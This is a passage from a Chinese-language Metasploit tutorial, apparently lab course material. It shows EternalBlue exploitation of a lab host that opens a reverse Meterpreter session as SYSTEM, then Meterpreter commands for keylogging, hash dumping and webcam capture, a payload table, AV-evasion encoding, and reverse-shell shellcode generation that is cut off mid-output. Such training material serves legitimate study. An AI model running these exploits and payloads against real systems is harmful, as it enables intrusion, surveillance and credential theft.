2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure><p>正如我们所见，通过<code>show payloads</code>在 Exploit 模块本身中运行命令，msfconsole 检测到目标是 Windows 机器，因此只显示针对 Windows 操作系统的有效负载。</p><p>我们还可以看到出现了一个新的选项字段，它与有效负载参数将包含的内容直接相关。我们将关注<code>LHOST</code>和<code>LPORT</code>（我们的攻击者 IP 和反向连接初始化所需的端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新发起攻击。</p><h2 id="使用负载"><a href="#使用负载" class="headerlink" title="使用负载"></a>使用负载</h2><p>是时候为 Exploit 模块和 payload 模块设置我们的参数了。对于利用部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>RHOSTS</code></td><td>远程主机的 IP 地址，目标机器。</td></tr><tr><td><code>RPORT</code></td><td>不需要更改，只需检查我们是否在运行 SMB 的端口 445 上。</td></tr></tbody></table><p>对于有效负载部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>LHOST</code></td><td>主机的IP地址，攻击者的机器。</td></tr><tr><td><code>LPORT</code></td><td>不需要更改，只需检查端口是否已被使用。</td></tr></tbody></table><p>如果我们想快速查看我们的 LHOST IP 地址，我们总是可以<code>ifconfig</code>直接从 msfconsole 菜单中调用该命令。</p><h4 id="MSF-利用和有效负载配置"><a href="#MSF-利用和有效负载配置" class="headerlink" title="MSF - 利用和有效负载配置"></a>MSF - 利用和有效负载配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(**windows/smb/ms17_010_eternalblue**) &gt; ifconfig</span><br><span class="line"></span><br><span class="line">**[\*]** exec: ifconfig</span><br><span class="line"></span><br><span class="line">tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br></pre></td></tr></table></figure><p>然后，我们可以运行漏洞并查看它返回的内容。查看以下输出中的差异：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.40</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line"></span><br><span class="line">[-] Unknown command: whoami.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>​该提示不是 Windows 命令行提示，而是<code>Meterpreter</code>提示符。通常用于 Windows 的命令<code>whoami</code>在这里不起作用。相反，我们可以使用 Linux 等效的<code>getuid</code>. 探索<code>help</code>菜单让我们更深入地了解 Meterpreter 有效载荷的能力。</p><h4 id="MSF-Meterpreter-命令"><a href="#MSF-Meterpreter-命令" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                当前会话的背景</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of Unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of Unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    IRB                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    LCD           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    PWD           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    get proxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of hostnames on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system&#x27;s local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    enumdesktops   List all accessible desktops and window stations</span><br><span class="line">    getdesktop     Get the current meterpreter desktop</span><br><span class="line">    idle time       Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyboard_send  Send keystrokes</span><br><span class="line">    keyevent       Send key events</span><br><span class="line">    keyscan_dump   Dump the keystroke buffer</span><br><span class="line">    keyscan_start  Start capturing keystrokes</span><br><span class="line">    keyscan_stop   Stop capturing keystrokes</span><br><span class="line">    mouse          Send mouse events</span><br><span class="line">    screenshare    Watch the remote user&#x27;s desktop in real-time</span><br><span class="line">    screenshot     Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop     Change the meterpreters current desktop</span><br><span class="line">    uictl          Control some of the user interface components</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    get system     Attempt to elevate your privilege to that of the local system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestamp Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestamp     Manipulate file MACE attributes</span><br></pre></td></tr></table></figure><p>很漂亮。从从 SAM 中提取用户哈希值到截取屏幕截图和激活网络摄像头。所有这些都是通过 Linux 风格的命令行轻松完成的。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。</p><h4 id="MSF-Meterpreter-导航"><a href="#MSF-Meterpreter-导航" class="headerlink" title="MSF - Meterpreter 导航"></a>MSF - Meterpreter 导航</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">Process 2664 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;</span><br></pre></td></tr></table></figure><p><code>Channel 1</code>已创建，我们将自动放入此机器的 CLI 中。这里的通道表示我们的设备和目标主机之间的连接，它已经使用 Meterpreter Stager 和 Stage 在反向 TCP 连接（从目标主机到我们）中建立。stager 在我们的机器上被激活，以等待由目标机器上的 Stage 有效负载初始化的连接请求。</p><p>在某些情况下，进入目标的标准 shell 是有帮助的，但 Meterpreter 也可以在受害机器上导航和执行操作。所以我们看到命令发生了变化，但我们在系统内具有相同的权限级别。</p><h4 id="MSF-Windows-CMD"><a href="#MSF-Windows-CMD" class="headerlink" title="MSF-Windows CMD"></a>MSF-Windows CMD</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A0EF-1911</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          .</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          ..</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          Administrator</span><br><span class="line">14/07/2017  14:45    &lt;DIR&gt;          haris</span><br><span class="line">12/04/2011  08:51    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  15,738,978,304 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>让我们看看我们可以使用哪些其他类型的有效载荷。我们将研究与 Windows 操作系统相关的最常见的问题。</p><h2 id="有效载荷类型"><a href="#有效载荷类型" class="headerlink" title="有效载荷类型"></a>有效载荷类型</h2><p>下表包含用于 Windows 机器的最常见有效负载及其各自的描述。</p><table><thead><tr><th><strong>有效载荷</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>generic/custom</code></td><td>通用监听器，多用途</td></tr><tr><td><code>generic/shell_bind_tcp</code></td><td>通用监听器，多用途，普通 shell，TCP 连接绑定</td></tr><tr><td><code>generic/shell_reverse_tcp</code></td><td>通用侦听器，多用途，普通外壳，反向 TCP 连接</td></tr><tr><td><code>windows/x64/exec</code></td><td>执行任意命令 (Windows x64)</td></tr><tr><td><code>windows/x64/loadlibrary</code></td><td>加载任意 x64 库路径</td></tr><tr><td><code>windows/x64/messagebox</code></td><td>使用可自定义的标题、文本和图标通过 MessageBox 生成一个对话框</td></tr><tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>普通 shell，单一负载，反向 TCP 连接</td></tr><tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>普通shell，stager + stage，反向TCP连接</td></tr><tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>普通外壳，stager + stage，IPv6 Bind TCP stager</td></tr><tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + 以上变体</td></tr><tr><td><code>windows/x64/powershell/$</code></td><td>交互式 PowerShell 会话 + 以上品种</td></tr><tr><td><code>windows/x64/vncinject/$</code></td><td>VNC 服务器（反射注入）+ 以上品种</td></tr></tbody></table><p>渗透测试人员在安全评估期间大量使用的其他关键有效载荷是 Empire 和 Cobalt Strike 有效载荷。这些不在本课程的范围内，但您可以在我们的空闲时间随意研究它们，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。</p><p>当然，除了这些之外，还有许多其他有效载荷。有些是针对特定设备供应商的，例如 Cisco、Apple 或 PLC。有些我们可以使用<code>msfvenom</code>. 然而，接下来，我们将研究<code>Targets</code>以及如何使用它们来影响攻击结果。</p><h1 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h1><hr><p>在 Metasploit 框架存在的 15 年中，<code>Encoders</code>它帮助使有效负载与不同的处理器架构兼容，同时帮助逃避防病毒。<code>Encoders</code>发挥改变有效载荷以在不同操作系统和体系结构上运行的作用。这些架构包括：</p><table><thead><tr><th><code>x64</code></th><th><code>x86</code></th><th><code>sparc</code></th><th><code>ppc</code></th><th><code>mips</code></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><code>bad characters</code>还需要它们从有效负载中删除已知的十六进制操作码。不仅如此，以不同格式编码有效载荷也有助于如上所述的反病毒检测。然而，随着 IPS&#x2F;IDS 制造商改进了他们的保护软件处理恶意软件和病毒签名的方式，严格用于 AV 规避的编码器的使用随着时间的推移已经减少。</p><p>Shikata Ga Nai ( <code>SGN</code>) 是当今最常用的编码方案之一，因为它很难检测到通过其机制编码的有效载荷不再普遍无法检测到。离得很远。名称 ( <code>仕方がない</code>) 的意思是<code>It cannot be helped</code>or <code>Nothing can be done about it</code>，如果我们几年前读到这篇文章的话，这是理所当然的。但是，我们将探索其他方法来规避保护系统。<a href="https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html">来自 FireEye 的这篇文章</a>详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。</p><hr><h2 id="选择编码器"><a href="#选择编码器" class="headerlink" title="选择编码器"></a>选择编码器</h2><p>在 2015 年之前，Metasploit 框架有不同的子模块来处理负载和编码器。它们与 msfconsole 脚本分开打包，并称为<code>msfpayload</code>and <code>msfencode</code>。这两个工具位于<code>/usr/share/framework2/</code>.</p><p>如果我们想创建我们的自定义负载，我们可以通过 来实现<code>msfpayload</code>，但我们必须根据目标操作系统架构对其进行编码，<code>msfencode</code>然后再使用。管道将从一个命令获取输出并将其馈送到下一个命令，这将生成一个编码的有效负载，准备好发送并在目标机器上运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b &#x27;\x00&#x27; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)</span><br><span class="line"></span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9&quot; .</span><br><span class="line">&quot;\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2&quot; .</span><br><span class="line">&quot;\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd&quot; .</span><br><span class="line">&quot;\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6&quot; .</span><br><span class="line">&quot;\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36&quot; .</span><br><span class="line">&quot;\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45&quot; .</span><br><span class="line">&quot;\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc&quot; .</span><br><span class="line">&quot;\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a&quot; .</span><br><span 